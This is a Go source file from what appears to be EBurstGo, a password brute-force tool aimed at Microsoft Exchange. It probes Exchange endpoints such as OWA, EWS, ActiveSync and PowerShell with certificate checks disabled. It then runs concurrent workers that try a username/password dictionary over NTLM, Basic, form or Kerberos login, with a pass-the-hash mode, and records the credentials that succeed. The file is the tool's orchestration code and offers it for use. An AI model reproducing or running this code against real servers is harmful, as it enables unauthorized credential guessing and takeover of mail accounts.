package brute

import (
	"EBurstGo/common"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

func Run(config *common.Config) {
	if config.Check {
		Check(config)
	} else {
		Brute(config)
	}
}

func Check(config *common.Config) {
	common.Log.Info("[*] checking exchange endpoints")

	for k, v := range common.ExchangeEndpoints {
		common.Log.Debug("[*] trying %v", v)

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					Renegotiation:      tls.RenegotiateOnceAsClient,
					MinVersion:         tls.VersionTLS10,
				},
				Proxy: func(_ *http.Request) (*url.URL, error) {
					if config.Proxy != "" {
						return url.Parse(config.Proxy)
					} else {
						return nil, nil
					}
				},
			},
		}

		target, _ := url.JoinPath(config.Url, v)
		res, err := client.Get(target)

		if err != nil {
			continue
		}

		if res.StatusCode != 404 && res.StatusCode != 403 && res.StatusCode != 301 && res.StatusCode != 302 {
			common.Log.Success("[+] %v (%v) exists", k, v)
		} else {
			common.Log.Failed("[-] %v (%v) does not exist", k, v)
		}
	}
}

func Brute(config *common.Config) {
	switch config.Mode {
	case "autodiscover", "ews", "mapi", "oab", "rpc":
		common.Worker = NtlmBruteWorker
	case "activesync":
		common.Worker = BasicBruteWorker
	case "owa", "ecp":
		common.Worker = HttpBruteWorker
	case "powershell":
		common.Worker = KerberosBruteWorker
	default:
		fmt.Println("[-] unknown endpoint")
		os.Exit(1)
	}

	common.Log.Info("[*] using %v endpoint: %v", config.Mode, config.Url)
	start := time.Now()

	target, _ := url.JoinPath(config.Url, common.ExchangeEndpoints[config.Mode])
	task := make(chan []string, len(common.UserPassDict))
	result := &common.Result{
		Creds:      make(map[string]string),
		OutputFile: config.OutputFile,
	}

	info := &common.TaskInfo{
		Target:  target,
		Task:    task,
		Result:  result,
		Domain:  config.Domain,
		Mode:    config.Mode,
		Delay:   config.Delay,
		Proxy:   config.Proxy,
		PthMode: config.PthMode,
	}

	for k, v := range common.UserPassDict {
		task <- []string{k, v}
	}
	close(task)

	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()
			common.Worker(info)
		}()
	}
	wg.Wait()

	end := time.Now()
	common.Log.Info("[*] costs: %v s", end.Sub(start))
}
